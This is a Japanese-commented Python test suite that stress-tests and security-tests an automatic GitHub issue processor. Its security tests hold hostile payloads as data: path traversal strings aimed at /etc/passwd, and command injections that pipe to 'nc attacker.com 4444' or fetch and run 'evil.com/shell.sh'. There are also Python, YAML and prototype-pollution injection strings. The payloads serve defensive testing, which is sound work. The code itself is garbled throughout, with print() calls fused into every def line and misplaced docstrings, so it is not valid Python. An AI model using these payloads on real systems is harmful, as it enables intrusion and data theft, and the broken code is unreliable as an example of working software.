#!/usr/bin/env python3
"""
統一Auto Issue Processor 極限監査スイート
実動作テスト、負荷テスト、異常系テスト、セキュリティペネトレーションテスト
"""

import asyncio
import os
import sys
import time
import random
import string
import tempfile
import shutil
import psutil
import threading
import multiprocessing
import signal
import json
import yaml
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch, AsyncMock
import concurrent.futures

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from libs.auto_issue_processor import AutoIssueProcessor, ProcessorConfig
from libs.auto_issue_processor.utils import ProcessLock


class ExtremeLoadTest:
    """極限負荷テスト"""
    
    @staticmethod
    async def test_massive_concurrent_locks()print("\n🔥 大量同時ロックテスト (1000同時ロック)")
    """大量同時ロックテスト"""
        issues = []
        lock_dir = "./extreme_test_locks"
        
        # 1000個の同時ロック試行
        locks = []
        tasks = []
        
        for i in range(1000):
            lock = ProcessLock("file", lock_dir=lock_dir)
            locks.append(lock)
            
            async def acquire_and_release(lock_instance, key):
                try:
                    acquired = await lock_instance.acquire(key, ttl=5)
                    if acquired:
                """acquire_and_releaseメソッド"""
                        await asyncio.sleep(random.uniform(0.001, 0.01))
                        await lock_instance.release(key)
                    return acquired
                except Exception as e:
                    return f"Error: {e}"
            
            # 一部は同じキーで競合させる
            key = f"test_key_{i % 100}"  # 100種類のキー
            tasks.append(acquire_and_release(lock, key))
        
        start_time = time.time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.time() - start_time
        
        # 結果分析
        success_count = sum(1 for r in results if r is True)
        error_count = sum(1 for r in results if isinstance(r, str) and r.startswith("Error"))
        
        print(f"  - 成功: {success_count}/1000")
        print(f"  - エラー: {error_count}")
        print(f"  - 処理時間: {elapsed:0.2f}秒")
        
        if error_count > 10:
            issues.append(f"❌ 大量ロックでエラー多発: {error_count}件")
        
        if elapsed > 10:
            issues.append(f"❌ ロック処理が遅すぎる: {elapsed:0.2f}秒")
        
        # クリーンアップ
        if os.path.exists(lock_dir):
            shutil.rmtree(lock_dir)
        
        return issues
    
    @staticmethod
    async def test_memory_stress()print("\n💾 メモリストレステスト")
    """メモリストレステスト"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = True
        
        # 初期メモリ
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # 1000個のプロセッサーインスタンスを作成
        processors = []
        for i in range(1000):
            processor = AutoIssueProcessor(config)
            processors.append(processor)
            
            if i % 100 == 0:
                current_memory = process.memory_info().rss / 1024 / 1024
                print(f"  - {i}個作成: {current_memory:0.1f}MB使用")
        
        final_memory = process.memory_info().rss / 1024 / 1024
        memory_per_instance = (final_memory - initial_memory) / 1000
        
        print(f"  - インスタンスあたり: {memory_per_instance:0.2f}MB")
        
        if memory_per_instance > 1:  # 1MB以上
            issues.append(f"❌ メモリ使用量が多すぎる: {memory_per_instance:0.2f}MB/インスタンス")
        
        # 解放後のメモリ確認
        processors.clear()
        import gc
        gc.collect()
        
        after_gc_memory = process.memory_info().rss / 1024 / 1024
        if after_gc_memory - initial_memory > 100:  # 100MB以上残存
            issues.append(f"❌ メモリが解放されない: {after_gc_memory - initial_memory:0.1f}MB残存")
        
        return issues
    
    @staticmethod
    async def test_cpu_stress()print("\n⚡ CPUストレステスト")
    """CPUストレステスト"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = True
        config.features.parallel_processing = True
        config.processing.max_parallel_workers = multiprocessing.cpu_count()
        
        # CPU負荷の高い処理をシミュレート
        processor = AutoIssueProcessor(config)
        
        # 100個の重いタスク
        mock_issues = []
        for i in range(100):
            issue = Mock()
            issue.number = i
            issue.title = f"Heavy Issue {i}"
            issue.body = "x" * 10000  # 大きなボディ
            issue.created_at = datetime.now()
            issue.labels = [Mock(name=f"label{j}") for j in range(10)]
            issue.comments = 100
            issue.pull_request = None
            mock_issues.append(issue)
        
        start_time = time.time()
        cpu_before = psutil.cpu_percent(interval=0.1)
        
        # 処理実行
        with patch.object(processor, '_get_issues_to_process', return_value=mock_issues):
            with patch.object(processor, '_execute_issue_processing', 
                            side_effect=lambda x: {"success": True, "artifacts": {}}):
                result = await processor.process_issues()
        
        elapsed = time.time() - start_time
        cpu_after = psutil.cpu_percent(interval=0.1)
        
        print(f"  - 処理時間: {elapsed:0.2f}秒")
        print(f"  - CPU使用率: {cpu_before}% → {cpu_after}%")
        
        if elapsed > 60:  # 1分以上
            issues.append(f"❌ 処理が遅すぎる: {elapsed:0.2f}秒")
        
        return issues


class ChaosTest:
    """カオステスト - 異常系の極限テスト"""
    
    @staticmethod
    async def test_random_failures()print("\n🎲 ランダム障害テスト")
    """ランダム障害テスト"""
        issues = []
        
        config = ProcessorConfig()
        config.features.error_recovery = True
        processor = AutoIssueProcessor(config)
        
        # ランダムに失敗する関数
        failure_count = 0
        
        async def random_failing_function(issue):
            nonlocal failure_count
            if random.random() < 0.3:  # 30%の確率で失敗
            """random_failing_functionメソッド"""
                failure_count += 1
                raise random.choice([
                    ConnectionError("Network error"),
                    TimeoutError("Timeout"),
                    ValueError("Invalid data"),
                    RuntimeError("Runtime error")
                ])
            return {"success": True, "artifacts": {}}
        
        # 100回実行
        with patch.object(processor, '_execute_issue_processing', 
                         side_effect=random_failing_function):
            
            mock_issues = [Mock(number=i) for i in range(100)]
            with patch.object(processor, '_get_issues_to_process', return_value=mock_issues):
                result = await processor.process_issues()
        
        print(f"  - 障害発生: {failure_count}/100回")
        print(f"  - 成功: {result['stats']['success']}")
        print(f"  - 失敗: {result['stats']['failed']}")
        
        recovery_rate = result['stats']['success'] / (result['stats']['success'] + result['stats']['failed'])
        if recovery_rate < 0.5:
            issues.append(f"❌ エラーリカバリー率が低い: {recovery_rate:0.1%}")
        
        return issues
    
    @staticmethod
    async def test_signal_handling()print("\n🚨 シグナルハンドリングテスト")
    """シグナルハンドリングテスト"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = True
        processor = AutoIssueProcessor(config)
        
        # 処理中にシグナルを送る
        async def long_running_task():
            await asyncio.sleep(5)
            return {"success": True}
        
        # タスク開始
        task = asyncio.create_task(long_running_task())
        
        # 1秒後にキャンセル
        await asyncio.sleep(1)
        task.cancel()
        
        try:
            await task
            issues.append("❌ キャンセルが効いていない")
        except asyncio.CancelledError:
            print("  ✓ 正常にキャンセルされました")
        
        return issues
    
    @staticmethod
    async def test_resource_exhaustion()print("\n💀 リソース枯渇テスト")
    """リソース枯渇テスト"""
        issues = []
        
        # ファイルディスクリプタ枯渇シミュレーション
        temp_files = []
        try:
            # 大量のファイルを開く
            for i in range(1000):
                tf = tempfile.NamedTemporaryFile(delete=False)
                temp_files.append(tf)
            
            # この状態でロック取得を試みる
            lock = ProcessLock("file")
            acquired = await lock.acquire("test_key", ttl=1)
            
            if not acquired:
                issues.append("⚠️ リソース枯渇時にロック取得失敗")
            else:
                await lock.release("test_key")
            
        except OSError as e:
            if "Too many open files" in str(e):
                print("  ✓ リソース枯渇を正しく検出")
            else:
                issues.append(f"❌ 予期しないエラー: {e}")
        finally:
            # クリーンアップ
            for tf in temp_files:
                try:
                    tf.close()
                    os.unlink(tf.name)
                except:
                    pass
        
        return issues


class SecurityPenetrationTest:
    """セキュリティペネトレーションテスト"""
    
    @staticmethod
    async def test_path_traversal_advanced()print("\n🔓 高度なパストラバーサル攻撃テスト")
    """高度なパストラバーサル攻撃"""
        issues = []
        
        # 様々な攻撃パターン
        attack_patterns = [
            "....//....//etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//",
            "\x00.0./../etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\..\\..\\..\\..\\..\\windows\\system32",
        ]
        
        lock = ProcessLock("file", lock_dir="./security_test_locks")
        
        for pattern in attack_patterns:
            try:
                # ロックキーとして攻撃パターンを使用
                result = await lock.acquire(pattern, ttl=1)
                if result:
                    await lock.release(pattern)
                    
                    # 実際のファイルパスを確認
                    lock_file = Path("./security_test_locks") / f"{pattern}.lock"
                    if ".." in str(lock_file.resolve()):
                        issues.append(f"❌ パストラバーサル可能: {pattern}")
            except Exception:
                # エラーは期待される動作
                pass
        
        # クリーンアップ
        if os.path.exists("./security_test_locks"):
            shutil.rmtree("./security_test_locks")
        
        return issues
    
    @staticmethod
    async def test_injection_advanced()print("\n💉 高度なインジェクション攻撃テスト")
    """高度なインジェクション攻撃"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = True
        
        # 様々なインジェクション試行
        injection_payloads = [
            # コマンドインジェクション
            "; cat /etc/passwd #",
            "| nc attacker.com 4444",
            "$(curl http://evil.com/shell.sh | bash)",
            "`whoami`",
            
            # Python コードインジェクション
            "__import__('os').system('id')",
            "eval('__import__(\"os\").system(\"id\")')",
            
            # YAML インジェクション
            "!!python/object/apply:os.system ['id']",
            
            # JSONインジェクション
            '{"$ne": null}',
            '{"__proto__": {"isAdmin": true}}',
        ]
        
        processor = AutoIssueProcessor(config)
        
        for payload in injection_payloads:
            mock_issue = Mock()
            mock_issue.number = 1
            mock_issue.title = payload
            mock_issue.body = payload
            mock_issue.created_at = datetime.now()
            mock_issue.labels = []
            mock_issue.comments = 0
            mock_issue.pull_request = None
            
            try:
                # 処理を試みる
                with patch.object(processor, 'repo') as mock_repo:
                    mock_repo.get_issue.return_value = mock_issue
                    result = await processor.process_issues([1])
                
                # ペイロードが実行されていないか確認
                # （実際には実行されないが、エスケープ確認）
                
            except Exception as e:
                # エラーメッセージにペイロードが含まれていないか
                if payload in str(e):
                    issues.append(f"⚠️ エラーメッセージにペイロード露出: {payload[:20]}...")
        
        return issues
    
    @staticmethod
    async def test_dos_attacks()print("\n💣 DoS攻撃テスト")
    """DoS攻撃テスト"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = True
        processor = AutoIssueProcessor(config)
        
        # 1.0 巨大データ攻撃
        huge_issue = Mock()
        huge_issue.number = 1
        huge_issue.title = "A" * 1000000  # 1MB のタイトル
        huge_issue.body = "B" * 10000000  # 10MB のボディ
        huge_issue.created_at = datetime.now()
        huge_issue.labels = [Mock(name=f"label{i}") for i in range(1000)]
        huge_issue.comments = 10000
        huge_issue.pull_request = None
        
        start_time = time.time()
        start_memory = psutil.Process().memory_info().rss / 1024 / 1024
        
        try:
            with patch.object(processor, 'repo') as mock_repo:
                mock_repo.get_issue.return_value = huge_issue
                result = await processor.process_issues([1])
        except MemoryError:
            issues.append("❌ メモリ不足でクラッシュ")
        
        elapsed = time.time() - start_time
        end_memory = psutil.Process().memory_info().rss / 1024 / 1024
        
        if elapsed > 10:
            issues.append(f"❌ 巨大データで処理が遅延: {elapsed:0.1f}秒")
        
        if end_memory - start_memory > 100:
            issues.append(f"❌ 過剰なメモリ使用: {end_memory - start_memory:0.1f}MB")
        
        # 2.0 無限ループ攻撃
        # （実装省略 - 実際のコードでは無限ループにならないため）
        
        return issues


class RealWorldTest:
    """実環境シミュレーションテスト"""
    
    @staticmethod
    async def test_github_api_simulation()print("\n🌐 GitHub API シミュレーションテスト")
    """GitHub API シミュレーション"""
        issues = []
        
        config = ProcessorConfig()
        config.dry_run = False  # 実際の処理をシミュレート
        config.github.token = "dummy_token_for_test"
        processor = AutoIssueProcessor(config)
        
        # API レート制限シミュレーション
        api_call_count = 0
        rate_limit_hit = False
        
        async def mock_api_call(*args, **kwargs):
            nonlocal api_call_count, rate_limit_hit
            """mock_api_callメソッド"""
            api_call_count += 1
            
            # 50回目でレート制限
            if api_call_count >= 50 and not rate_limit_hit:
                rate_limit_hit = True
                raise Exception("API rate limit exceeded")
            
            return Mock()
        
        # 100個のIssueを処理
        with patch.object(processor, 'github') as mock_github:
            mock_github.get_rate_limit.return_value = Mock(
                core=Mock(remaining=100, limit=5000)
            )
            
            mock_issues = []
            for i in range(100):
                issue = Mock()
                issue.number = i
                issue.title = f"Issue {i}"
                issue.body = "Test issue"
                issue.created_at = datetime.now()
                issue.labels = []
                issue.comments = 0
                issue.pull_request = None
                mock_issues.append(issue)
            
            with patch.object(processor, '_get_issues_to_process', return_value=mock_issues[:10]):
                try:
                    result = await processor.process_issues()
                except Exception as e:
                    if "rate limit" in str(e):
                        print("  ✓ レート制限を正しく検出")
                    else:
                        issues.append(f"❌ 予期しないエラー: {e}")
        
        print(f"  - API呼び出し: {api_call_count}回")
        
        return issues
    
    @staticmethod
    async def test_real_file_operations()print("\n📁 実ファイル操作テスト")
    """実際のファイル操作テスト"""
        issues = []
        
        test_dir = Path("./real_world_test")
        test_dir.mkdir(exist_ok=True)
        
        try:
            # 1000個のファイル作成
            for i in range(1000):
                file_path = test_dir / f"test_{i}.txt"
                file_path.write_text(f"Test content {i}")
            
            # ディスク容量チェック
            disk_usage = shutil.disk_usage(test_dir)
            free_gb = disk_usage.free / (1024**3)
            
            if free_gb < 1:
                issues.append("⚠️ ディスク容量不足の可能性")
            
            # ファイル操作の並行性テスト
            async def concurrent_file_op(index):
                """concurrent_file_opメソッド"""
                file_path = test_dir / f"concurrent_{index}.txt"
                for _ in range(10):
                    file_path.write_text(f"Update {_}")
                    content = file_path.read_text()
                    if content != f"Update {_}":
                        return False
                return True
            
            tasks = [concurrent_file_op(i) for i in range(100)]
            results = await asyncio.gather(*tasks)
            
            if not all(results):
                issues.append("❌ ファイル操作の並行性に問題")
            
        finally:
            # クリーンアップ
            if test_dir.exists():
                shutil.rmtree(test_dir)
        
        return issues


async def run_extreme_audit()print("=" * 80)
"""極限監査の実行"""
    print("統一Auto Issue Processor 極限監査")
    print("=" * 80)
    print("⚠️  この監査は高負荷をかけます")
    print()
    
    all_issues = []
    
    # 1.0 極限負荷テスト
    print("🔥 極限負荷テスト")
    print("-" * 40)
    load_issues = []
    load_issues.extend(await ExtremeLoadTest.test_massive_concurrent_locks())
    load_issues.extend(await ExtremeLoadTest.test_memory_stress())
    load_issues.extend(await ExtremeLoadTest.test_cpu_stress())
    
    if load_issues:
        for issue in load_issues:
            print(f"  {issue}")
        all_issues.extend(load_issues)
    else:
        print("  ✅ 極限負荷テスト合格")
    
    # 2.0 カオステスト
    print("\n🌪️ カオステスト")
    print("-" * 40)
    chaos_issues = []
    chaos_issues.extend(await ChaosTest.test_random_failures())
    chaos_issues.extend(await ChaosTest.test_signal_handling())
    chaos_issues.extend(await ChaosTest.test_resource_exhaustion())
    
    if chaos_issues:
        for issue in chaos_issues:
            print(f"  {issue}")
        all_issues.extend(chaos_issues)
    else:
        print("  ✅ カオステスト合格")
    
    # 3.0 セキュリティペネトレーション
    print("\n🔐 セキュリティペネトレーション")
    print("-" * 40)
    security_issues = []
    security_issues.extend(await SecurityPenetrationTest.test_path_traversal_advanced())
    security_issues.extend(await SecurityPenetrationTest.test_injection_advanced())
    security_issues.extend(await SecurityPenetrationTest.test_dos_attacks())
    
    if security_issues:
        for issue in security_issues:
            print(f"  {issue}")
        all_issues.extend(security_issues)
    else:
        print("  ✅ セキュリティテスト合格")
    
    # 4.0 実環境シミュレーション
    print("\n🌍 実環境シミュレーション")
    print("-" * 40)
    real_issues = []
    real_issues.extend(await RealWorldTest.test_github_api_simulation())
    real_issues.extend(await RealWorldTest.test_real_file_operations())
    
    if real_issues:
        for issue in real_issues:
            print(f"  {issue}")
        all_issues.extend(real_issues)
    else:
        print("  ✅ 実環境テスト合格")
    
    # 総合結果
    print("\n" + "=" * 80)
    print("極限監査結果")
    print("=" * 80)
    
    critical_count = len([i for i in all_issues if i.startswith("❌")])
    warning_count = len([i for i in all_issues if i.startswith("⚠️")])
    
    print(f"🔴 重大な問題: {critical_count}件")
    print(f"🟡 警告: {warning_count}件")
    print(f"📋 総問題数: {len(all_issues)}件")
    
    # 監査レポート保存
    report = {
        "audit_type": "extreme",
        "audit_date": datetime.now().isoformat(),
        "critical_issues": critical_count,
        "warnings": warning_count,
        "total_issues": len(all_issues),
        "details": all_issues,
        "tests_performed": [
            "massive_concurrent_locks",
            "memory_stress",
            "cpu_stress",
            "random_failures",
            "signal_handling",
            "resource_exhaustion",
            "path_traversal_advanced",
            "injection_advanced",
            "dos_attacks",
            "github_api_simulation",
            "real_file_operations"
        ]
    }
    
    report_file = f"logs/extreme_audit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    os.makedirs("logs", exist_ok=True)
    
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print(f"\n📄 監査レポート保存: {report_file}")
    
    if critical_count == 0:
        print("\n✅ 極限監査合格！")
        print("   統一Auto Issue Processorは極限状況でも安定して動作します")
    else:
        print("\n❌ 極限監査で問題発見")
        print("   本番環境での使用前に修正が必要です")
    
    return critical_count == 0


if __name__ == "__main__":
    # システムリソースの確認
    print("システムリソース:")
    print(f"  CPU: {multiprocessing.cpu_count()}コア")
    print(f"  メモリ: {psutil.virtual_memory().total / (1024**3):0.1f}GB")
    print(f"  空きメモリ: {psutil.virtual_memory().available / (1024**3):0.1f}GB")
    print()
    
    # 自動実行モード
    print("⚠️  極限監査を自動実行します（高負荷注意）")
    print()
    
    # 極限監査実行
    success = asyncio.run(run_extreme_audit())
    sys.exit(0 if success else 1)